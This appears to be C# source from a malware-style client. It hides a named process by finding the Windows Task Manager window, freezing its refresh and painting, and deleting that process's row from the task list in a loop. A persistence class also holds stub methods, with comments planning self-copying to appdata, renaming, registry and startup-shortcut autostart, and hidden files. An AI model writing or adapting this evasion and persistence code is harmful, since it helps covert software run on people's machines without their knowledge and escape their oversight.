using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;

namespace Client.API
{
    /// <summary>
    /// Contains classes that are meant to be used through threads.
    /// </summary>
    public class ThreadedAPI
    {
        public static bool IsRunning = true;
        private static readonly Logger _Log = new Logger(Logger.source.CLIENT);

        /// <summary>
        /// Threaded class for handling proccess related things
        /// </summary>
        public class TProcs
        {
            private struct TaskManagerStruct
            {
                // Main window
                IntPtr _lhWndParent;

                // UI Controls, Mainwindow, mainpanel, ListView, ListViewHeader.
                IntPtr _lhTaskManagerMain,
                       _lhDirectUIHWND,
                       _lhSysListView32,
                       _lhSysHeader32;

                // Task Manager Menus
                IntPtr _hMenu,
                       _hSubMenu,
                       _hSubSubMenu;

                // Menu refresh options
                List<int> _mRefreshOptions;
                public enum RefreshRates
                {
                    Stop    = 0,
                    Slow    = 1,
                    Normal  = 2,
                    High    = 3
                }


                // Refresh now button
                int _refreshNowButton; 
                
                public TaskManagerStruct(string te)
                {
                    _lhWndParent = User32.FindWindow(null, "Task Manager");

                    _lhTaskManagerMain = new IntPtr(); 
                    _lhDirectUIHWND = new IntPtr();
                    _lhSysListView32 = new IntPtr();
                    _lhSysHeader32 = new IntPtr();

                    _hMenu = new IntPtr();
                    _hSubMenu = new IntPtr();
                    _hSubSubMenu = new IntPtr();

                    _refreshNowButton = 0;
                    _mRefreshOptions = new List<int>();
                }

                public void DisableSorting(bool disable)
                {
                    User32.EnableWindow(_lhSysHeader32, !disable);
                }

                public void SortProcessAlphabetically()
                {
                      User32.PostMessage(_lhSysListView32, User32.LVM_SORTITEMS, 0, 0); //Sort
                }

                public void DeleteProcess(int index)
                {
                    User32.PostMessage(_lhSysListView32, User32.LVM_DELETEITEM, index, 0); //Delete
                }

                public void DisableManualRefresh(bool disable)
                {
                    User32.EnableMenuItem(_hMenu, (uint)_refreshNowButton, disable ? User32.MF_GRAYED : User32.MF_ENABLED);
                }

                public void DisableTaskListOnPaint(bool disable)
                {
                    if (disable)
                        User32.LockWindowUpdate(_lhSysListView32);
                    else
                        User32.LockWindowUpdate(IntPtr.Zero);
                }

                public void SetRefreshRate(RefreshRates speed)
                {
                    User32.PostMessage(_lhWndParent, User32.WM_COMMAND, _mRefreshOptions[(int)speed], 0);
                }

                public void DisableRefreshRates(bool disable)
                {
                    foreach (int b in _mRefreshOptions)
                        User32.EnableMenuItem(_hMenu, (uint) b, disable? User32.MF_GRAYED : User32.MF_ENABLED);
                }

                public void PopulateOffsets()
                {
                    #region Window Panel
                    _lhTaskManagerMain = User32.FindWindowEx(_lhWndParent, _lhTaskManagerMain, null, null);
                    _lhDirectUIHWND = User32.FindWindowEx(_lhTaskManagerMain, _lhDirectUIHWND, null, null);

                    for (int i = 0; i < 7; i++)
                    {
                        _lhSysListView32 = User32.FindWindowEx(_lhDirectUIHWND, _lhSysListView32, null, null);

                        if (User32.FindWindowEx(_lhSysListView32, IntPtr.Zero, "SysListView32", null) != IntPtr.Zero)
                        {
                            Console.WriteLine(" Found tasklist window at 0x" + _lhSysListView32.ToString("X"));
                            lhSysListView32 = User32.FindWindowEx(_lhSysListView32, IntPtr.Zero, "SysListView32", null);
                            lhSysHeader32 = User32.FindWindowEx(_lhSysListView32, IntPtr.Zero, "SysHeader32", null);
                            break;
                        }
                    }
                    #endregion
                    #region menubar
                    // Get Task manager menus
                    _hMenu = User32.GetMenu(_lhWndParent);
                    _hSubMenu = User32.GetSubMenu(_hMenu, 2);
                    _hSubSubMenu = User32.GetSubMenu(_hSubMenu, 1);

                    // Refresh now button
                    _refreshNowButton = User32.GetMenuItemID(_hSubMenu, 0);
                    #endregion
                    #region refresh rates
                    _mRefreshOptions = new List<int>
                    {
                        User32.GetMenuItemID(_hSubSubMenu, 0),
                        User32.GetMenuItemID(_hSubSubMenu, 1),
                        User32.GetMenuItemID(_hSubSubMenu, 2),
                        User32.GetMenuItemID(_hSubSubMenu, 3)
                    };
                    #endregion
                }

                public IntPtr lhWndParent
                {
                    get { return _lhWndParent; } 
                    set { _lhWndParent = value; }
                }
                public IntPtr lhTaskManagerMain
                {
                    get { return _lhTaskManagerMain; }
                    set { _lhTaskManagerMain = value ; }
                }
                public IntPtr lhDirectUIHWND 
                {
                    get { return _lhDirectUIHWND; }
                    set { _lhDirectUIHWND = value; }
                }
                public IntPtr lhSysListView32
                {
                    get { return _lhSysListView32; }
                    set { _lhSysListView32 = value; }
                }
                public IntPtr lhSysHeader32
                {
                    get { return _lhSysHeader32; }
                    set { _lhSysHeader32 = value; }
                }
            }

            /// <summary>
            /// If the task manager is open, intercept the kernel process call and alter the return value.
            /// </summary>
            /// <param name="processName"></param>
            public static void HideProccess(object processName)
            {
                _Log.Write(Logger.Actions.NEW_THREAD, "Hiding: " + processName, "OK");

                while (ThreadedAPI.IsRunning)
                {
                    IntPtr TaskMgrAddress = User32.FindWindow(null, "Task Manager");
                    
                    if (TaskMgrAddress != IntPtr.Zero)
                    {
                        _Log.Write(Logger.Actions.INFO, "Detected Task Manager at 0x" + TaskMgrAddress.ToString("X"));
                        if (DeleteProcessFromTaskList(processName))
                        {
                            _Log.Write(Logger.Actions.INFO, "Hidden: " + processName, "OK");
                            break;
                        }
                    }

                    Thread.Sleep(1);
                }
            }

            /// <summary>
            ///     Hides a process from the task manager description tasklist
            /// </summary>
            /// <param name="procName"> The desired process to hide.</param>
             private static bool DeleteProcessFromTaskList(object procName)
            {
                TaskManagerStruct taskManager = new TaskManagerStruct();
                 taskManager.PopulateOffsets();
              

                 taskManager.SetRefreshRate(TaskManagerStruct.RefreshRates.Stop);
                 taskManager.DisableManualRefresh(true);
                 taskManager.DisableTaskListOnPaint(true);


                List<Process> proclist = Process.GetProcesses().ToList();
                proclist = proclist.OrderBy(x => x.ProcessName).ToList();

                int index = 0;

                foreach (Process p in proclist)
                {
                    if (p.ProcessName.ToLower().Contains(procName.ToString().ToLower()))
                        index = proclist.IndexOf(p);
                }


                //User32.PostMessage(lhWndParent, User32.WM_COMMAND, refreshNowButton, 0); //Refresh
               taskManager.DisableSorting(false);
               taskManager.SortProcessAlphabetically();
               taskManager.DeleteProcess(index);
            

                User32.LockWindowUpdate(IntPtr.Zero);
                //User32.PostMessage(lhWndParent, User32.WM_COMMAND, updateNowList[1], 0);
                Console.WriteLine("Removed at " + index);
                return true;
            }
        }

        /// <summary>
        /// Threaded class for handling persistence of this application.
        /// </summary>
        public class TPersistence
        {
            private static class AssemblyInfo
            {
                public static readonly Process Proc = Process.GetCurrentProcess();

                public static string NAME = AppDomain.CurrentDomain.FriendlyName,
                                     PATH = AppDomain.CurrentDomain.BaseDirectory,
                                     TaskName = Proc.ProcessName;
            }

            public static bool IsFirstExecution = true;

            public TPersistence()
            {
                // Confirm we're not already running to avoid conflictions.
                if (!IsOnlyInstance())
                {
                    Environment.Exit(1056);
                }

                // Check if this is the first time running the application.
                if (IsFirstExecution)
                {
                    // Create: 
                    //  - Self replicate to appdata
                    //  - Rename self.
                    //  - Registry startup value.
                    //  - Windows startup shortcut
                    //  - Set shortcuts to hidden.
                }
            }

            // Confirms this is the only instance running.
            private bool IsOnlyInstance()
            {
                Process[] processList = Process.GetProcessesByName(AssemblyInfo.Proc.ProcessName);

                if (processList.Length > 1)
                    return false;

                return true;
            }

            // Copys a file to a specified directory.
            private void Copy(string destination)
            {
            }

            // Sets the hidden flag on a file.
            private bool HideFile(string file)
            {
                return true;
            }
        }
    }
}
